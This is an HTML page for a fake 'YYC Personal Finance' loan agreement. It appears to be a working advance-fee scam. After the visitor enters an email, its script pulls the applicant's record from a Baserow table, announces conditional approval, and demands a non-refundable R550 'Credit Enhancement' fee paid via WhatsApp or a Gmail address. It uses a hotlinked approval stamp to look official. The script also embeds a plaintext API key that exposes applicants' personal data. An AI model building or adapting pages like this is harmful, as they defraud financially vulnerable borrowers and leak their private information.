<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
    <title>Loan Agreement & Approval - YYC Personal Finance</title>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/html2pdf.js/0.10.1/html2pdf.bundle.min.js"></script>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <style>
        :root {
            --primary: #d61313;
            --secondary: #1C75BC;
            --dark: #333;
            --gray: #6c757d;
            --page-bg: #f9f9f9;
            --doc-bg: #ffffff;
            --success: #28a745;
        }

        @import url('https://fonts.googleapis.com/css2?family=Roboto:wght@400;500;700&display=swap');

        body {
            background-color: var(--page-bg);
            font-family: 'Roboto', sans-serif;
            color: var(--dark);
            line-height: 1.6;
            margin: 0;
            padding: 20px;
        }
        /* Header */
        header {
            background: rgba(255, 255, 255, 0.95);
            backdrop-filter: blur(10px);
            padding: 15px 5%;
            display: flex;
            justify-content: space-between;
            align-items: center;
            position: sticky;
            top: 0;
            z-index: 1000;
            box-shadow: 0 2px 20px rgba(0,0,0,0.1);
        }

        .logo {
            display: flex;
            align-items: center;
        }

        .logo h1 {
            font-size: 1.5rem;
            color: var(--primary);
            font-weight: 700;
        }

        .logo .ncr {
            font-size: 0.8rem;
            color: var(--gray);
            margin-left: 10px;
        }

        /* Desktop Navigation */
        .desktop-nav {
            display: block;
        }

        .desktop-nav ul {
            display: flex;
            list-style: none;
            gap: 20px;
        }

        .desktop-nav .nav-link {
            text-decoration: none;
            color: var(--dark);
            font-weight: 500;
            padding: 8px 16px;
            border-radius: 20px;
            transition: all 0.3s ease;
        }

        .desktop-nav .nav-link:hover,
        .desktop-nav .nav-link.active {
            color: var(--primary);
            background: rgba(214, 19, 19, 0.1);
        }

        /* Mobile Menu Button */
        .mobile-menu-btn {
            display: block;
            background: none;
            border: none;
            font-size: 1.2rem;
            cursor: pointer;
            color: var(--dark);
            padding: 8px;
        }

        /* Main Content */
        .main-content {
            max-width: 1200px;
            margin: 40px auto;
            padding: 0 20px;
        }

        /* Login Section */
        .login-section {
            max-width: 500px;
            margin: 0 auto;
            background: white;
            border-radius: 20px;
            padding: 40px;
            box-shadow: 0 15px 40px rgba(0,0,0,0.1);
            border: 2px solid rgba(214, 19, 19, 0.1);
            text-align: center;
        }

        .login-section h1 {
            font-size: 2.5rem;
            color: var(--dark);
            margin-bottom: 20px;
            font-weight: 700;
        }

        .login-section p {
            color: var(--gray);
            margin-bottom: 30px;
            font-size: 1.1rem;
        }

        .login-form {
            text-align: left;
        }

        .form-group {
            margin-bottom: 20px;
        }

        .form-group label {
            display: block;
            margin-bottom: 8px;
            font-weight: 600;
            color: var(--dark);
        }

        .form-control {
            width: 100%;
            padding: 15px;
            border: 2px solid rgba(214, 19, 19, 0.1);
            border-radius: 10px;
            font-size: 1rem;
            transition: all 0.3s ease;
        }

        .form-control:focus {
            outline: none;
            border-color: var(--primary);
            box-shadow: 0 0 0 3px rgba(214, 19, 19, 0.1);
        }

        .btn {
            display: inline-block;
            padding: 15px 40px;
            background: var(--gradient-secondary);
            color: white;
            text-decoration: none;
            border-radius: 50px;
            font-weight: 600;
            text-transform: uppercase;
            letter-spacing: 1px;
            border: none;
            cursor: pointer;
            transition: all 0.4s ease;
            font-size: 1rem;
            width: 100%;
            margin-bottom: 20px;
        }
        
        .btn:disabled {
            background: var(--gray);
            cursor: not-allowed;
        }

        .btn:hover:not(:disabled) {
            transform: translateY(-3px) scale(1.05);
            box-shadow: 0 15px 30px rgba(230, 57, 70, 0.4);
        }

        .register-link {
            text-align: center;
            margin-top: 30px;
            padding-top: 20px;
            border-top: 1px solid rgba(0,0,0,0.1);
        }

        .register-link p {
            color: var(--gray);
            margin-bottom: 15px;
        }

        .btn-outline {
            background: transparent;
            color: var(--primary);
            border: 2px solid var(--primary);
        }

        .btn-outline:hover {
            background: var(--primary);
            color: white;
        }

        /* Verification Modal */
        .verification-modal {
            display: flex;
            position: fixed;
            z-index: 3000;
            left: 0;
            top: 0;
            width: 100%;
            height: 100%;
            background-color: rgba(0,0,0,0.7);
            align-items: center;
            justify-content: center;
        }

        .verification-content {
            background-color: #ffffff;
            padding: 30px 40px;
            border-radius: 10px;
            width: 90%;
            max-width: 450px;
            text-align: center;
            box-shadow: 0 5px 20px rgba(0,0,0,0.3);
        }
        
        .verification-content h3 {
            margin-top: 0;
            font-size: 1.5rem;
            color: var(--primary);
        }

        .verification-content .form-group { text-align: left; margin-bottom: 20px; }
        .verification-content label { display: block; margin-bottom: 8px; font-weight: 500; }
        .verification-content .form-control {
            width: 100%;
            padding: 12px;
            border: 1px solid #ccc;
            border-radius: 5px;
            font-size: 1rem;
        }
        
        .verify-btn {
            background-color: var(--primary);
            color: white;
            border: none;
            padding: 12px 25px;
            border-radius: 5px;
            cursor: pointer;
            width: 100%;
            font-weight: 700;
            font-size: 1.1rem;
            transition: background-color 0.3s ease;
        }
        
        .verify-btn:disabled { background-color: var(--gray); cursor: not-allowed; }
        .verify-btn:hover:not(:disabled) { background-color: #b00f0f; }
        
        #verification-error {
            color: var(--primary);
            margin-top: 15px;
            font-weight: 500;
            min-height: 20px;
        }

        /* Main Document Wrapper (hidden by default) */
        #document-wrapper {
            display: none;
        }
        
        .toolbar {
            position: fixed;
            top: 15px;
            right: 20px;
            z-index: 1001;
        }

        .toolbar-btn {
            background-color: var(--primary);
            color: white;
            border: none;
            padding: 10px 18px;
            border-radius: 5px;
            cursor: pointer;
            font-weight: 500;
            box-shadow: 0 2px 8px rgba(0,0,0,0.25);
            transition: all 0.3s ease;
        }
        
        .toolbar-btn:hover {
            background-color: #b00f0f;
            transform: translateY(-2px);
        }

        .document-container {
            max-width: 850px;
            margin: 20px auto;
        }
        
        .page {
            background: var(--doc-bg);
            border: 1px solid #e0e0e0;
            padding: 40px 50px;
            position: relative;
            min-height: 1120px;
            margin-bottom: 20px;
            box-shadow: 0 4px 12px rgba(0,0,0,0.1);
        }

        .doc-header {
            display: flex;
            justify-content: space-between;
            align-items: flex-start;
            border-bottom: 3px solid var(--primary);
            padding-bottom: 15px;
            margin-bottom: 25px;
        }

        .doc-header .logo h1 { color: var(--primary); font-size: 2.2rem; margin: 0; }
        .doc-header .logo h2 { color: var(--secondary); font-size: 1.1rem; margin: 0; font-weight: 500; }
        .doc-header .header-info { text-align: right; font-size: 0.9rem; color: var(--gray); }

        .doc-footer {
            position: absolute;
            bottom: 4px;
            left: 50px;
            right: 50px;
            text-align: center;
            font-size: 0.85rem;
            color: var(--gray);
            border-top: 1px solid #ddd;
            padding-top: 10px;
        }

        h3 {
            font-size: 1.4rem;
            color: var(--primary);
            border-bottom: 1px solid #eee;
            padding-bottom: 8px;
            margin-top: 25px;
            margin-bottom: 15px;
        }

        .info-box {
            background: #f9f9f9;
            border-left: 5px solid var(--secondary);
            padding: 15px 20px;
            margin: 20px 0;
            border-radius: 5px;
        }
        
        .info-box ul { list-style: none; padding: 0; margin: 0; }
        .info-box ul li { padding: 6px 0; display: flex; justify-content: space-between; font-size: 1.05rem; }

        .warning-box {
            background: #fffbe6;
            border: 1px solid #ffe58f;
            border-left: 5px solid #ffc107;
            padding: 20px;
            margin: 25px 0;
            border-radius: 8px;
        }
        
        .warning-box h4 { margin-top: 0; color: #d66b0a; font-size: 1.25rem; }

        .pay-now {
            display: inline-block;
            background: var(--success);
            color: white;
            padding: 15px 30px;
            border-radius: 5px;
            font-weight: bold;
            text-decoration: none;
            transition: all 0.3s ease;
            text-transform: uppercase;
            letter-spacing: 1px;
            border: none;
            cursor: pointer;
        }
        .pay-now:hover { background-color: #218838; transform: scale(1.05); }

        .amortization-table { width: 100%; border-collapse: collapse; margin-top: 20px; }
        .amortization-table th, .amortization-table td { border: 1px solid #ddd; padding: 10px; text-align: right; }
        .amortization-table th { background-color: #f2f2f2; font-weight: 700; }
        
        .signature-section { margin-top: 50px; display: flex; justify-content: space-between; align-items: flex-end; }
        .signature-block { border-top: 1px solid var(--dark); padding-top: 10px; width: 45%; }
        .stamp-area { width: 45%; text-align: center; }
        .stamp-area img { width: 130px; opacity: 0.8; }

        /* Payment Modal Styles */
        .modal { display: none; position: fixed; z-index: 2000; left: 0; top: 0; width: 100%; height: 100%; background-color: rgba(0,0,0,0.6); }
        .modal-content { background-color: #fefefe; margin: 15% auto; padding: 30px; border-radius: 10px; width: 90%; max-width: 500px; text-align: center; box-shadow: 0 5px 15px rgba(0,0,0,0.3); }
        .close-btn { color: #aaa; float: right; font-size: 28px; font-weight: bold; cursor: pointer; }
        .contact-icon { font-size: 1.5rem; margin: 10px; color: var(--primary); }
        
        @media print {
            body { padding: 0; background: #fff; }
            .toolbar, .verification-modal, .page { box-shadow: none; border: none; margin: 0; }
            #document-wrapper { display: block !important; }
            .document-container { width: 100%; }
            .page { min-height: 0; page-break-after: always; }
            .page:last-child { page-break-after: auto; }
        }
    </style>
</head>
<body>
    <!-- Header -->
    <header>
        <div class="logo">
            <h1>YYC CASH LOAN</h1>
            <span class="ncr">NCRCP15906</span>
        </div>
        <nav class="desktop-nav">
            <ul>
                <li><a href="index.html" class="nav-link">Home</a></li>
                <li><a href="apply.html" class="nav-link">Apply</a></li>
                <li><a href="loans.html" class="nav-link">Loans</a></li>
                <li><a href="how-it-works.html" class="nav-link">How It Works</a></li>
                <li><a href="account.html" class="nav-link active">Account</a></li>
            </ul>
        </nav>
        <button class="mobile-menu-btn" id="mobileMenuBtn"><i class="fas fa-bars"></i></button>
    </header>

<!-- Verification Modal -->
<div id="verificationModal" class="verification-modal">
    <div class="verification-content">
        <h3><i class="fas fa-lock"></i> Secure Document Access</h3>
        <p>Please enter your email address to verify your identity and view your loan agreement.</p>
        <form id="verificationForm">
            <div class="form-group">
                <label for="verification-email">Email Address</label>
                <input type="email" id="verification-email" class="form-control" required>
            </div>
            <button type="submit" id="verifyBtn" class="verify-btn">Verify & View Document</button>
            <div id="verification-error"></div>
        </form>
    </div>
</div>


<div id="document-wrapper">
    <div class="toolbar">
        <button class="toolbar-btn" id="downloadPdfBtn"><i class="fas fa-download"></i> Download PDF</button>
    </div>

    <div class="document-container" id="loanDocument">
        <!-- Page 1: Approval & Fee -->
        <div class="page" id="page1">
            <div class="doc-header">
                <div class="logo"><h1>YYC</h1><h2>PERSONAL FINANCE</h2></div>
                <div class="header-info">
                    <strong>Loan Agreement:</strong> Conditionally Approved<br>
                    <strong>Date:</strong> <span id="current-date"></span><br>
                    <strong>Ref ID:</strong> L-202408-<span id="application-id"></span>
                </div>
            </div>

            <h3>Subject: Conditional Loan Approval Notification</h3>
            <p>Dear <strong id="user-name-body"></strong>,</p>
            <p>We are pleased to inform you that your personal loan application has met the initial requirements and has been conditionally approved. This document outlines the approved terms and the final step required to disburse your funds.</p>

            <div class="info-box">
                <h4>Approved Loan Terms</h4>
                <ul>
                    <li><span>Loan Amount Approved:</span> <strong id="loan-amount"></strong></li>
                    <li><span>Loan Repayment Term:</span> <strong id="loan-duration"></strong></li>
                    <li><span>Fixed Annual Interest Rate:</span> <strong>3.00%</strong></li>
                    <li><span>Estimated Monthly Installment:</span> <strong id="monthly-payment"></strong></li>
                </ul>
            </div>
            
            <div class="warning-box">
                <h4><i class="fas fa-exclamation-triangle"></i> Action Required: Credit Enhancement Program</h4>
                <p>Our final assessment indicates that your credit score is below the standard threshold for immediate loan disbursement. To proceed, enrollment in our **Credit Enhancement Program** is mandatory.</p>
                <p>This program is designed to strengthen your credit standing and guarantee the instant release of your funds. It is a one-time process with a proven success rate.</p>
                <ul>
                    <li><strong>One-Time Program Fee:</strong> <strong style="color: var(--primary); font-size: 1.3em;">R550.00</strong></li>
                </ul>
                <p class="highlight">Upon successful payment of this fee, your approved loan of <strong id="loan-amount-2"></strong> will be transferred to your bank account without any further delay.</p>
            </div>

            <h3>Final Step to Receive Your Loan</h3>
            <p>To finalize the agreement and trigger the immediate transfer of funds, please complete the payment for the Credit Enhancement Program.</p>
            <div style="text-align: center; margin-top: 30px;">
                <button id="payNowBtn" class="pay-now">💳 Pay R550 Now & Secure Loan</button>
            </div>

            <div class="doc-footer">Page 1 of 3</div>
        </div>

        <!-- Page 2: Amortization Schedule -->
        <div class="page" id="page2">
            <div class="doc-header">
                <div class="logo"><h1>YYC</h1><h2>PERSONAL FINANCE</h2></div>
                <div class="header-info"><strong>Attachment:</strong> Loan Amortization Schedule</div>
            </div>
            <h3>Loan Repayment Schedule</h3>
            <p>This table details the breakdown of each monthly payment over the loan term, showing how each payment contributes to interest and reduces your outstanding principal balance.</p>
            
            <table class="amortization-table">
                <thead>
                    <tr>
                        <th>Payment #</th>
                        <th>Payment Amount</th>
                        <th>Interest Paid</th>
                        <th>Principal Paid</th>
                        <th>Remaining Balance</th>
                    </tr>
                </thead>
                <tbody id="amortization-body"></tbody>
            </table>

            <div class="doc-footer">Page 2 of 3</div>
        </div>
        
        <!-- Page 3: T&Cs and Signature -->
        <div class="page" id="page3">
            <div class="doc-header">
                <div class="logo"><h1>YYC</h1><h2>PERSONAL FINANCE</h2></div>
                <div class="header-info"><strong>Attachment:</strong> Terms & Declaration</div>
            </div>
            <h3>Terms & Conditions</h3>
            <ul>
                <li><strong>Agreement:</strong> This document constitutes a conditional loan offer. It becomes a binding agreement upon the fulfillment of all stated conditions.</li>
                <li><strong>Credit Enhancement Fee:</strong> The R550 fee is a non-refundable payment for services rendered to improve the applicant's credit profile to meet disbursement criteria. It is not part of the loan principal.</li>
                <li><strong>Prepayment:</strong> The loan may be settled early in full or in part at any time without incurring penalties.</li>
                <li><strong>Default:</strong> Failure to make timely monthly payments may result in late fees, legal action, and adverse reporting to national credit bureaus, which will impact your credit score.</li>
                <li><strong>Privacy:</strong> All personal information is handled in strict compliance with the Protection of Personal Information (POPI) Act of South Africa.</li>
            </ul>

            <h3>Declaration & Signature</h3>
            <p>By proceeding with the payment, I, <strong id="user-name-3"></strong>, confirm that I have read, fully understood, and agree to all terms and conditions outlined in this 3-page loan document. I authorize YYC Loans to execute the Credit Enhancement Program and disburse the approved loan funds into my designated account upon successful payment of the R550 fee.</p>

            <div class="signature-section">
                <div class="signature-block">
                    <strong>Applicant's Acknowledgment & Digital Assent</strong>
                    <p style="font-size: 0.9rem;">(Payment of fee constitutes a digital signature)</p>
                </div>
                <div class="stamp-area">
                    <img src="https://style.propertystories.co.za/wp-content/uploads/2019/10/3_Original_Approved_Stamp_-_Copy-1-300x203.png" alt="Official Approval Stamp">
                    <p class="highlight" style="margin:0;">For YYC Loans Management</p>
                </div>
            </div>
            <div class="doc-footer">Page 3 of 3</div>
        </div>
    </div>
</div>

<!-- The Payment Modal -->
<div id="contactModal" class="modal">
  <div class="modal-content">
    <span class="close-btn">×</span>
    <h3>Secure Payment & Inquiries</h3>
    <p>For the R550 fee, please use your Loan Ref ID: <strong>L-202408-<span id="application-id-modal"></span></strong></p>
    <div>
        <i class="fab fa-whatsapp contact-icon"></i>
        <p><strong>WhatsApp Payments:</strong> +27659174470</p>
    </div>
    <div>
        <i class="fas fa-envelope contact-icon"></i>
        <p><strong>Email Support:</strong> aidmyfin@gmail.com</p>
    </div>
  </div>
</div>

<script>
    // --- Baserow API Configuration ---
    const BASEROW_API_BASE_URL = 'https://api.baserow.io/api/';
    const BASEROW_API_KEY = 'qVXtv5uzHaSzMLbLRE7rITJHlc4G6WN2';
    const BASEROW_TABLE_ID = '558162';
    const EMAIL_FIELD_ID = '4477079';
    const FULLNAME_FIELD_ID = '4477077';
    const LOAN_AMOUNT_FIELD_ID = '4477085';
    const REPAYMENT_PERIOD_FIELD_ID = '4477086';
    
    const formatCurrency = (num) => `R${num.toLocaleString('en-ZA', { minimumFractionDigits: 2, maximumFractionDigits: 2 })}`;

    /**
     * Fetches user data from Baserow based on email.
     */
    async function fetchUserData(email) {
        const url = `${BASEROW_API_BASE_URL}database/rows/table/${BASEROW_TABLE_ID}/?filter__field_${EMAIL_FIELD_ID}__equal=${encodeURIComponent(email)}&user_field_names=false`;
        try {
            const response = await fetch(url, {
                method: 'GET',
                headers: { 'Authorization': `Token ${BASEROW_API_KEY}` }
            });
            if (!response.ok) {
                console.error("Baserow API Error:", await response.text());
                return null;
            }
            const data = await response.json();
            return (data.results && data.results.length > 0) ? data.results[0] : null;
        } catch (error) {
            console.error("Network or script error:", error);
            return null;
        }
    }

    /**
     * Generates the repayment schedule based on the custom calculation.
     */
    function generateAmortizationSchedule(principal, duration, monthlyPayment) {
        const tableBody = document.getElementById("amortization-body");
        tableBody.innerHTML = '';
        
        const totalInterest = principal * 0.03;
        const interestPortion = totalInterest / duration;
        const principalPortion = principal / duration;
        let remainingBalance = principal;

        for (let i = 1; i <= duration; i++) {
            remainingBalance -= principalPortion;
            
            if (i === duration) remainingBalance = 0; // Correct final balance

            const row = `<tr>
                <td>${i}</td>
                <td>${formatCurrency(monthlyPayment)}</td>
                <td>${formatCurrency(interestPortion)}</td>
                <td>${formatCurrency(principalPortion)}</td>
                <td>${formatCurrency(Math.abs(remainingBalance))}</td>
            </tr>`;
            tableBody.innerHTML += row;
        }
    }

    /**
     * Populates the entire document with data fetched from Baserow.
     */
    function populateDocument(userData) {
        // Extract data
        const fullName = userData[`field_${FULLNAME_FIELD_ID}`] || 'Valued Applicant';
        const loanAmount = parseFloat(userData[`field_${LOAN_AMOUNT_FIELD_ID}`] || 0);
        const loanDurationStr = userData[`field_${REPAYMENT_PERIOD_FIELD_ID}`] || '0 months';
        const loanDuration = parseInt(loanDurationStr, 10);
        const appId = userData.id || Math.floor(1000 + Math.random() * 9000);

        // --- Perform Calculations ---
        const totalRepayable = loanAmount * 1.03; // Loan Amount + 3%
        const monthlyPayment = loanDuration > 0 ? totalRepayable / loanDuration : 0;
        
        // --- Populate all dynamic fields ---
        document.getElementById("user-name-body").textContent = fullName;
        document.getElementById("user-name-3").textContent = fullName;
        document.getElementById("application-id").textContent = appId;
        document.getElementById("application-id-modal").textContent = appId;
        
        document.getElementById("loan-amount").textContent = formatCurrency(loanAmount);
        document.getElementById("loan-amount-2").textContent = formatCurrency(loanAmount);
        document.getElementById("loan-duration").textContent = `${loanDuration} Months`;
        document.getElementById("monthly-payment").textContent = formatCurrency(monthlyPayment);

        const today = new Date().toLocaleDateString("en-ZA", { year: 'numeric', month: 'long', day: 'numeric' });
        document.getElementById("current-date").textContent = today;
        
        // Generate the amortization schedule with new values
        generateAmortizationSchedule(loanAmount, loanDuration, monthlyPayment);
    }
    
    // --- Event Listener for Verification Form ---
    document.getElementById('verificationForm').addEventListener('submit', async function(e) {
        e.preventDefault();
        const email = document.getElementById('verification-email').value.trim();
        const verifyBtn = document.getElementById('verifyBtn');
        const errorMessage = document.getElementById('verification-error');
        
        if (!email) {
            errorMessage.textContent = "Please enter an email address.";
            return;
        }

        verifyBtn.disabled = true;
        verifyBtn.textContent = 'Verifying...';
        errorMessage.textContent = '';

        const userData = await fetchUserData(email);

        if (userData) {
            populateDocument(userData);
            // Hide verification modal and show document
            document.getElementById('verificationModal').style.display = 'none';
            document.getElementById('document-wrapper').style.display = 'block';
        } else {
            errorMessage.textContent = "No application found for this email. Please try again.";
            verifyBtn.disabled = false;
            verifyBtn.textContent = 'Verify & View Document';
        }
    });

    // --- Logic for Payment Modal ---
    const contactModal = document.getElementById("contactModal");
    const payNowBtn = document.getElementById("payNowBtn");
    const closeBtn = contactModal.querySelector(".close-btn");
    payNowBtn.onclick = () => contactModal.style.display = "block";
    closeBtn.onclick = () => contactModal.style.display = "none";
    window.onclick = (event) => {
        if (event.target == contactModal) contactModal.style.display = "none";
    };

    // --- PDF Download Logic ---
    document.getElementById('downloadPdfBtn').addEventListener('click', function () {
        const element = document.getElementById('loanDocument');
        const opt = {
            margin: [0, 0, 0, 0],
            filename: `YYC_Loan_Agreement_${document.getElementById("application-id").textContent}.pdf`,
            image: { type: 'jpeg', quality: 0.98 },
            html2canvas: { scale: 2, useCORS: true },
            jsPDF: { unit: 'in', format: 'a4', orientation: 'portrait' }
        };
        html2pdf().set(opt).from(element).save();
    });

</script>

</body>
</html>
